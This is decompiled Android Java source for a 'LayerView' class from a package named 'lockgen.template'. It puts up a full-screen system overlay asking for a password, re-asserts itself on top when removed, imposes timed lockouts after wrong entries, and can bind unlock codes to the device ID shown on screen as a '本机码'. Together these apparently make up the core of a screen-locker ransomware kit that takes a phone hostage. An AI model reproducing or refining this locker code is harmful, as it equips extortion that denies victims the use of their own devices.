package com.lockgen.template.app.core;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.GridLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import java.util.ArrayList;
import java.util.List;
import kotlin.KotlinVersion;
import kotlin.text.Typography;
import org.json.JSONArray;
import org.json.JSONObject;

public class LayerView {
    private static final boolean DEBUG_BYPASS = false;
    private static final String TAG = "TplLayer";
    private final String algo;
    private final boolean bind;
    private final Callback callback;
    private final Context ctx;
    private final String deviceId;
    private int errCount;
    private final String hash;
    private final int index;
    private final int iters;
    private int kbAccent;
    private GridLayout kbGrid;
    private int kbPage;
    private List<String[]> kbPages;
    private List<TextView> kbTabs;
    private int kbTextColor;
    private long lastReassert;
    private final JSONObject layer;
    private final int lockMs;
    private long lockUntil;
    private final int maxErr;
    private WindowManager.LayoutParams params;
    private View root;
    private final String salt;
    private boolean showing;
    private final JSONObject theme;
    private Runnable ticker;
    private final int total;
    private TextView tvMask;
    private TextView tvStatus;
    private final WindowManager wm;
    private static final String[] PAGE_LETTERS = "abcdefghijklmnopqrstuvwxyz".split("");
    private static final String[] PAGE_DIGITS = "0123456789".split("");
    private static final String[] PAGE_SYMBOLS = "-_.@#!*:/?=+".split("");
    private final Handler ui = new Handler(Looper.getMainLooper());
    private final StringBuilder input = new StringBuilder();

    /* loaded from: /data/np/file-convert/2026093007491480cce562-3470-4c39-9483-6e6ce6bea0d7/2026093007491480cce562-3470-4c39-9483-6e6ce6bea0d7.dex */
    public interface Callback {
        void onUnlocked(int i);
    }

    private int pickColumns(int i) {
        if (i <= 12) {
            return 4;
        }
        return i <= 20 ? 5 : 7;
    }

    public LayerView(Context context, JSONObject jSONObject, JSONObject jSONObject2, int i, int i2, Callback callback) {
        this.ctx = context;
        this.layer = jSONObject;
        this.theme = jSONObject2;
        this.index = i;
        this.total = i2;
        this.callback = callback;
        this.wm = (WindowManager) context.getSystemService("window");
        this.maxErr = Cfg.i(jSONObject, "maxErr", 5);
        this.lockMs = Cfg.i(jSONObject, "lockMin", 5) * 60000;
        this.algo = Cfg.str(jSONObject, "algo", "md5it");
        this.salt = Cfg.str(jSONObject, "salt", "");
        this.iters = Cfg.i(jSONObject, "iters", 2000);
        this.bind = Cfg.b(jSONObject, "bind", false);
        this.hash = Cfg.str(jSONObject, "hash", "");
        this.deviceId = Pwd.androidId(context);
    }

    public boolean isShowing() {
        return this.showing;
    }

    public int getIndex() {
        return this.index;
    }

    public void show() {
        boolean z;
        if (this.showing) {
            return;
        }
        try {
            String str = Cfg.str(this.theme, "bg", "#0B0F15");
            int parseColor = parseColor(Cfg.str(this.theme, "accent", "#3AE0FF"), -12918529);
            int parseColor2 = parseColor(Cfg.str(this.theme, "text", "#FFFFFF"), -1);
            int parseColor3 = parseColor(Cfg.str(this.theme, "btnBg", "#FF3B30"), -50384);
            int parseColor4 = parseColor(Cfg.str(this.theme, "btnText", "#FFFFFF"), -1);
            FrameLayout frameLayout = new FrameLayout(this.ctx);
            frameLayout.setBackgroundColor(parseColor(str, -16052459));
            frameLayout.setClickable(true);
            frameLayout.setFocusable(true);
            if (Cfg.b(this.theme, "bgImage", true)) {
                Bitmap image = Assets.image(this.ctx, "bg_" + this.index + ".png");
                if (image == null) {
                    image = Assets.image(this.ctx, "bg.png");
                }
                if (image != null) {
                    ImageView imageView = new ImageView(this.ctx);
                    imageView.setScaleType(ImageView.ScaleType.CENTER_CROP);
                    imageView.setImageBitmap(image);
                    frameLayout.addView(imageView, new FrameLayout.LayoutParams(-1, -1));
                    View view = new View(this.ctx);
                    view.setBackgroundColor(Math.max(0, Math.min((int) KotlinVersion.MAX_COMPONENT_VALUE, Cfg.i(this.theme, "veil", 102))) << 24);
                    frameLayout.addView(view, new FrameLayout.LayoutParams(-1, -1));
                }
            }
            if (Cfg.b(this.theme, "particles", true)) {
                ParticleView particleView = new ParticleView(this.ctx, parseColor);
                particleView.setAlpha(0.55f);
                frameLayout.addView(particleView, new FrameLayout.LayoutParams(-1, -1));
            }
            LinearLayout linearLayout = new LinearLayout(this.ctx);
            linearLayout.setOrientation(1);
            linearLayout.setGravity(1);
            linearLayout.setPadding(dp(20), dp(56), dp(20), dp(28));
            ScrollView scrollView = new ScrollView(this.ctx);
            scrollView.setFillViewport(true);
            scrollView.setVerticalScrollBarEnabled(false);
            scrollView.setOverScrollMode(2);
            scrollView.addView(linearLayout, new FrameLayout.LayoutParams(-1, -2));
            frameLayout.addView(scrollView, new FrameLayout.LayoutParams(-1, -1));
            TextView textView = new TextView(this.ctx);
            textView.setText(Cfg.str(this.layer, "title", "请输入密码"));
            textView.setTextColor(parseColor2);
            textView.setTextSize(2, Cfg.i(this.theme, "titleSize", 24));
            textView.setTypeface(Typeface.DEFAULT_BOLD);
            textView.setGravity(17);
            linearLayout.addView(textView);
            String str2 = Cfg.str(this.layer, "tip", "");
            if (str2.isEmpty()) {
                z = true;
            } else {
                z = true;
                TextView textView2 = new TextView(this.ctx);
                textView2.setText(str2.replace("{n}", String.valueOf(this.index + 1)).replace("{total}", String.valueOf(this.total)));
                textView2.setTextColor(-855638017);
                textView2.setTextSize(2, Cfg.i(this.theme, "tipSize", 13));
                textView2.setGravity(17);
                LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-2, -2);
                layoutParams.topMargin = dp(10);
                linearLayout.addView(textView2, layoutParams);
            }
            TextView textView3 = new TextView(this.ctx);
            this.tvMask = textView3;
            textView3.setText("");
            this.tvMask.setHint(Cfg.str(this.layer, "hint", "密码"));
            this.tvMask.setHintTextColor(1442840575);
            this.tvMask.setTextColor(parseColor2);
            this.tvMask.setGravity(17);
            this.tvMask.setTextSize(2, 20.0f);
            this.tvMask.setSingleLine(z);
            GradientDrawable gradientDrawable = new GradientDrawable();
            gradientDrawable.setColor(587202559);
            gradientDrawable.setCornerRadius(dp(12));
            gradientDrawable.setStroke(dp(1), (16777215 & parseColor) | 1711276032);
            this.tvMask.setBackground(gradientDrawable);
            LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(dp(250), dp(52));
            layoutParams2.topMargin = dp(22);
            linearLayout.addView(this.tvMask, layoutParams2);
            LinearLayout.LayoutParams layoutParams3 = new LinearLayout.LayoutParams(-1, -2);
            layoutParams3.topMargin = dp(18);
            linearLayout.addView(buildPagedKeyboard(parseColor, parseColor2), layoutParams3);
            Button button = new Button(this.ctx);
            button.setText(Cfg.str(this.layer, "btn", "解锁"));
            button.setTextColor(parseColor4);
            button.setTextSize(2, 17.0f);
            GradientDrawable gradientDrawable2 = new GradientDrawable();
            gradientDrawable2.setColor(parseColor3);
            gradientDrawable2.setCornerRadius(dp(10));
            button.setBackground(gradientDrawable2);
            button.setAllCaps(false);
            button.setOnClickListener(new View.OnClickListener() { // from class: com.lockgen.template.app.core.LayerView$$ExternalSyntheticLambda4
                @Override // android.view.View.OnClickListener
                public final void onClick(View view2) {
                    LayerView.this.lambda$show$0(view2);
                }
            });
            LinearLayout.LayoutParams layoutParams4 = new LinearLayout.LayoutParams(dp(250), dp(50));
            layoutParams4.topMargin = dp(18);
            linearLayout.addView(button, layoutParams4);
            Cfg.obj(this.layer, "unlock");
            final int i = Cfg.i(this.layer, "longPressSec", 0);
            if (i > 0) {
                button.setOnLongClickListener(new View.OnLongClickListener() { // from class: com.lockgen.template.app.core.LayerView$$ExternalSyntheticLambda5
                    @Override // android.view.View.OnLongClickListener
                    public final boolean onLongClick(View view2) {
                        boolean lambda$show$1;
                        lambda$show$1 = LayerView.this.lambda$show$1(i, view2);
                        return lambda$show$1;
                    }
                });
            }
            TextView textView4 = new TextView(this.ctx);
            this.tvStatus = textView4;
            textView4.setTextColor(parseColor(Cfg.str(this.theme, "warn", "#FFD54F"), -10929));
            this.tvStatus.setTextSize(2, 13.0f);
            this.tvStatus.setGravity(17);
            LinearLayout.LayoutParams layoutParams5 = new LinearLayout.LayoutParams(-2, -2);
            layoutParams5.topMargin = dp(12);
            linearLayout.addView(this.tvStatus, layoutParams5);
            if (Cfg.b(this.layer, "showDevice", false)) {
                TextView textView5 = new TextView(this.ctx);
                textView5.setText("本机码 " + Pwd.shortCode(this.ctx));
                textView5.setTextColor(1728053247);
                textView5.setTextSize(2, 11.0f);
                LinearLayout.LayoutParams layoutParams6 = new LinearLayout.LayoutParams(-2, -2);
                layoutParams6.topMargin = dp(10);
                linearLayout.addView(textView5, layoutParams6);
            }
            WindowManager.LayoutParams layoutParams7 = new WindowManager.LayoutParams(-1, -1, 2038, 131968, -3);
            this.params = layoutParams7;
            layoutParams7.gravity = 8388659;
            this.params.packageName = this.ctx.getPackageName();
            this.params.windowAnimations = 0;
            this.wm.addView(frameLayout, this.params);
            this.root = frameLayout;
            this.showing = true;
            startTicker();
        } catch (Throwable th) {
            Log.e(TAG, "显示锁屏层失败", th);
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$show$0(View view) {
        submit();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ boolean lambda$show$1(int i, View view) {
        Toast.makeText(this.ctx, "长按 " + i + " 秒可重置输入状态", 0).show();
        this.errCount = 0;
        this.lockUntil = 0L;
        refreshStatus();
        return true;
    }

    private View buildPagedKeyboard(int i, int i2) {
        this.kbAccent = i;
        this.kbTextColor = i2;
        this.kbPages = new ArrayList();
        ArrayList arrayList = new ArrayList();
        JSONArray arr = Cfg.arr(this.layer, "keys");
        if (arr.length() > 0) {
            String[] strArr = new String[arr.length()];
            for (int i3 = 0; i3 < arr.length(); i3++) {
                strArr[i3] = arr.optString(i3, "");
            }
            this.kbPages.add(strArr);
            arrayList.add("自定义");
        } else {
            String str = Cfg.str(this.layer, "kb", "letters");
            boolean z = str.contains("letters") || str.contains("both") || str.isEmpty();
            if (!str.contains("digits")) {
                str.contains("both");
            }
            if (z) {
                this.kbPages.add(PAGE_LETTERS);
                arrayList.add("字母");
            }
            this.kbPages.add(PAGE_DIGITS);
            arrayList.add("数字");
            this.kbPages.add(PAGE_SYMBOLS);
            arrayList.add("符号");
        }
        LinearLayout linearLayout = new LinearLayout(this.ctx);
        linearLayout.setGravity(17);
        this.kbTabs = new ArrayList();
        for (final int i4 = 0; i4 < arrayList.size(); i4++) {
            TextView textView = new TextView(this.ctx);
            textView.setText((CharSequence) arrayList.get(i4));
            textView.setTextColor(i2);
            textView.setTextSize(2, 12.0f);
            textView.setPadding(dp(6), dp(6), dp(6), dp(6));
            textView.setOnClickListener(new View.OnClickListener() { // from class: com.lockgen.template.app.core.LayerView$$ExternalSyntheticLambda6
                @Override // android.view.View.OnClickListener
                public final void onClick(View view) {
                    LayerView.this.lambda$buildPagedKeyboard$2(i4, view);
                }
            });
            LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-2, -2);
            layoutParams.leftMargin = dp(10);
            layoutParams.rightMargin = dp(10);
            linearLayout.addView(textView, layoutParams);
            this.kbTabs.add(textView);
        }
        GridLayout gridLayout = new GridLayout(this.ctx);
        this.kbGrid = gridLayout;
        gridLayout.setAlignmentMode(0);
        this.kbGrid.setUseDefaultMargins(false);
        SwipeLayout swipeLayout = new SwipeLayout(this.ctx, new Runnable() { // from class: com.lockgen.template.app.core.LayerView$$ExternalSyntheticLambda7
            @Override // java.lang.Runnable
            public final void run() {
                LayerView.this.lambda$buildPagedKeyboard$3();
            }
        }, new Runnable() { // from class: com.lockgen.template.app.core.LayerView$$ExternalSyntheticLambda8
            @Override // java.lang.Runnable
            public final void run() {
                LayerView.this.lambda$buildPagedKeyboard$4();
            }
        });
        swipeLayout.addView(linearLayout, new LinearLayout.LayoutParams(-1, -2));
        LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(-2, -2);
        layoutParams2.gravity = 1;
        layoutParams2.topMargin = dp(8);
        swipeLayout.addView(this.kbGrid, layoutParams2);
        this.kbPage = defaultKbPage();
        renderKbPage();
        return swipeLayout;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$buildPagedKeyboard$2(int i, View view) {
        this.kbPage = i;
        renderKbPage();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$buildPagedKeyboard$3() {
        switchKbPage(1);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$buildPagedKeyboard$4() {
        switchKbPage(-1);
    }

    private int defaultKbPage() {
        String[] strArr;
        List<String[]> list = this.kbPages;
        if (list != null && !list.isEmpty()) {
            String str = Cfg.str(this.layer, "plain", "");
            boolean z = !str.isEmpty() && str.matches("\\d+");
            for (int i = 0; i < this.kbPages.size(); i++) {
                boolean z2 = false;
                boolean z3 = false;
                for (String str2 : this.kbPages.get(i)) {
                    if (str2 != null && !str2.isEmpty()) {
                        char charAt = str2.charAt(0);
                        if (Character.isDigit(charAt)) {
                            z2 = true;
                        }
                        if (Character.isLetter(charAt)) {
                            z3 = true;
                        }
                    }
                }
                if ((z && z2 && !z3) || (!z && z3)) {
                    return i;
                }
            }
        }
        return 0;
    }

    private void switchKbPage(int i) {
        int i2;
        List<String[]> list = this.kbPages;
        if (list == null || list.isEmpty() || (i2 = this.kbPage + i) < 0 || i2 >= this.kbPages.size()) {
            return;
        }
        this.kbPage = i2;
        renderKbPage();
    }

    private void renderKbPage() {
        List<String[]> list;
        if (this.kbGrid == null || (list = this.kbPages) == null || list.isEmpty()) {
            return;
        }
        int i = 0;
        int max = Math.max(0, Math.min(this.kbPages.size() - 1, this.kbPage));
        this.kbPage = max;
        String[] strArr = this.kbPages.get(max);
        this.kbGrid.removeAllViews();
        int pickColumns = pickColumns(strArr.length + 2);
        this.kbGrid.setColumnCount(pickColumns);
        int max2 = Math.max(dp(30), Math.min(dp(64), ((this.ctx.getResources().getDisplayMetrics().widthPixels - dp(56)) / Math.max(1, pickColumns)) - dp(6)));
        int i2 = (int) (max2 * 0.92f);
        for (final String str : strArr) {
            if (str != null && !str.isEmpty()) {
                this.kbGrid.addView(key(str, max2, i2, this.kbAccent, this.kbTextColor, new Runnable() { // from class: com.lockgen.template.app.core.LayerView$$ExternalSyntheticLambda0
                    @Override // java.lang.Runnable
                    public final void run() {
                        LayerView.this.lambda$renderKbPage$5(str);
                    }
                }));
            }
        }
        this.kbGrid.addView(key("⌫", max2, i2, this.kbAccent, this.kbTextColor, new Runnable() { // from class: com.lockgen.template.app.core.LayerView$$ExternalSyntheticLambda1
            @Override // java.lang.Runnable
            public final void run() {
                LayerView.this.lambda$renderKbPage$6();
            }
        }));
        this.kbGrid.addView(key("C", max2, i2, this.kbAccent, this.kbTextColor, new Runnable() { // from class: com.lockgen.template.app.core.LayerView$$ExternalSyntheticLambda2
            @Override // java.lang.Runnable
            public final void run() {
                LayerView.this.lambda$renderKbPage$7();
            }
        }));
        if (this.kbTabs != null) {
            while (i < this.kbTabs.size()) {
                TextView textView = this.kbTabs.get(i);
                textView.setAlpha(i == this.kbPage ? 1.0f : 0.42f);
                textView.setTextSize(2, i == this.kbPage ? 13.0f : 12.0f);
                i++;
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$renderKbPage$6() {
        if (this.input.length() > 0) {
            StringBuilder sb = this.input;
            sb.deleteCharAt(sb.length() - 1);
            refreshMask();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public /* synthetic */ void lambda$renderKbPage$7() {
        this.input.setLength(0);
        refreshMask();
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* loaded from: /data/np/file-convert/2026093007491480cce562-3470-4c39-9483-6e6ce6bea0d7/2026093007491480cce562-3470-4c39-9483-6e6ce6bea0d7.dex */
    public class SwipeLayout extends LinearLayout {
        private float downX;
        private float downY;
        private boolean handled;
        private final Runnable onSwipeLeft;
        private final Runnable onSwipeRight;

        SwipeLayout(Context context, Runnable runnable, Runnable runnable2) {
            super(context);
            this.onSwipeLeft = runnable;
            this.onSwipeRight = runnable2;
            setOrientation(1);
        }

        @Override // android.view.ViewGroup
        public boolean onInterceptTouchEvent(MotionEvent motionEvent) {
            int actionMasked = motionEvent.getActionMasked();
            if (actionMasked == 0) {
                this.downX = motionEvent.getX();
                this.downY = motionEvent.getY();
                this.handled = false;
            } else if (actionMasked == 2 && !this.handled) {
                float x = motionEvent.getX() - this.downX;
                float y = motionEvent.getY() - this.downY;
                if (Math.abs(x) > LayerView.this.dp(48) && Math.abs(x) > Math.abs(y) * 1.4f) {
                    this.handled = true;
                    if (x < 0.0f) {
                        this.onSwipeLeft.run();
                    } else {
                        this.onSwipeRight.run();
                    }
                    return true;
                }
            }
            return false;
        }
    }

    private Button key(String str, int i, int i2, int i3, int i4, final Runnable runnable) {
        Button button = new Button(this.ctx);
        button.setText(str);
        button.setTextColor(i4);
        button.setTextSize(2, 17.0f);
        button.setAllCaps(false);
        button.setPadding(0, 0, 0, 0);
        GradientDrawable gradientDrawable = new GradientDrawable();
        gradientDrawable.setColor(452984831);
        gradientDrawable.setCornerRadius(dp(9));
        gradientDrawable.setStroke(dp(1), (i3 & 16777215) | 855638016);
        button.setBackground(gradientDrawable);
        GridLayout.LayoutParams layoutParams = new GridLayout.LayoutParams();
        layoutParams.width = i;
        layoutParams.height = i2;
        layoutParams.setMargins(dp(3), dp(3), dp(3), dp(3));
        button.setLayoutParams(layoutParams);
        button.setOnClickListener(new View.OnClickListener() { // from class: com.lockgen.template.app.core.LayerView$$ExternalSyntheticLambda3
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                runnable.run();
            }
        });
        return button;
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* renamed from: push */
    public void lambda$renderKbPage$5(String str) {
        if (this.lockUntil <= System.currentTimeMillis() && this.input.length() < 64) {
            this.input.append(str);
            refreshMask();
        }
    }

    private void refreshMask() {
        if (this.tvMask == null) {
            return;
        }
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < this.input.length(); i++) {
            sb.append(Typography.bullet);
        }
        this.tvMask.setText(sb.toString());
    }

    private void submit() {
        boolean verify;
        if (this.lockUntil > System.currentTimeMillis()) {
            Toast.makeText(this.ctx, "已锁定，请稍后重试", 0).show();
            return;
        }
        String sb = this.input.toString();
        if (sb.isEmpty()) {
            Toast.makeText(this.ctx, "请输入密码", 0).show();
            return;
        }
        if ("device".equals(Cfg.str(this.layer, "mode", "plain"))) {
            verify = Pwd.derive(this.algo, Cfg.str(this.layer, "seed", "") + this.deviceId, this.salt, this.iters, false, "").equals(sb);
        } else {
            String str = this.hash;
            verify = (str == null || str.isEmpty()) ? true : Pwd.verify(this.algo, sb, this.salt, this.iters, this.bind, this.deviceId, this.hash);
        }
        if (verify) {
            this.input.setLength(0);
            refreshMask();
            this.errCount = 0;
            this.lockUntil = 0L;
            TextView textView = this.tvStatus;
            if (textView != null) {
                textView.setText("");
            }
            dismiss();
            Callback callback = this.callback;
            if (callback != null) {
                callback.onUnlocked(this.index);
                return;
            }
            return;
        }
        int i = this.errCount + 1;
        this.errCount = i;
        int max = Math.max(0, this.maxErr - i);
        String str2 = Cfg.str(this.layer, "err", "密码错误，剩余 {left} 次");
        TextView textView2 = this.tvStatus;
        if (textView2 != null) {
            textView2.setText(Cfg.fmt(str2, max, 0, 0, this.index + 1, this.total));
        }
        Toast.makeText(this.ctx, Cfg.fmt(str2, max, 0, 0, this.index + 1, this.total), 0).show();
        this.input.setLength(0);
        refreshMask();
        if (this.errCount >= this.maxErr) {
            this.lockUntil = System.currentTimeMillis() + this.lockMs;
        }
    }

    private void startTicker() {
        stopTicker();
        Runnable runnable = new Runnable() { // from class: com.lockgen.template.app.core.LayerView.1
            @Override // java.lang.Runnable
            public void run() {
                LayerView.this.refreshStatus();
                LayerView.this.ui.postDelayed(this, 500L);
            }
        };
        this.ticker = runnable;
        this.ui.postDelayed(runnable, 500L);
    }

    private void stopTicker() {
        Runnable runnable = this.ticker;
        if (runnable != null) {
            this.ui.removeCallbacks(runnable);
            this.ticker = null;
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void refreshStatus() {
        if (this.tvStatus != null && this.lockUntil > System.currentTimeMillis()) {
            long currentTimeMillis = this.lockUntil - System.currentTimeMillis();
            String str = Cfg.str(this.layer, "locked", "已锁定 {mm} 分 {ss} 秒");
            this.tvStatus.setText(Cfg.fmt(str, 0, (int) (currentTimeMillis / 60000), (int) ((currentTimeMillis % 60000) / 1000), this.index + 1, this.total));
        }
    }

    public void reassertTop() {
        if (!this.showing || this.root == null || this.params == null) {
            return;
        }
        long currentTimeMillis = System.currentTimeMillis();
        if (currentTimeMillis - this.lastReassert < 500) {
            return;
        }
        this.lastReassert = currentTimeMillis;
        try {
            this.wm.removeView(this.root);
            try {
                this.wm.addView(this.root, this.params);
            } catch (Throwable unused) {
                dismiss();
                show();
            }
        } catch (Throwable unused2) {
            dismiss();
            show();
        }
    }

    public void dismiss() {
        stopTicker();
        View view = this.root;
        if (view != null) {
            try {
                this.wm.removeView(view);
            } catch (Throwable unused) {
            }
        }
        this.root = null;
        this.showing = false;
        this.input.setLength(0);
        TextView textView = this.tvMask;
        if (textView != null) {
            textView.setText("");
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public int dp(int i) {
        return (int) ((i * this.ctx.getResources().getDisplayMetrics().density) + 0.5f);
    }

    private static int parseColor(String str, int i) {
        try {
            return Color.parseColor(str);
        } catch (Throwable unused) {
            return i;
        }
    }
}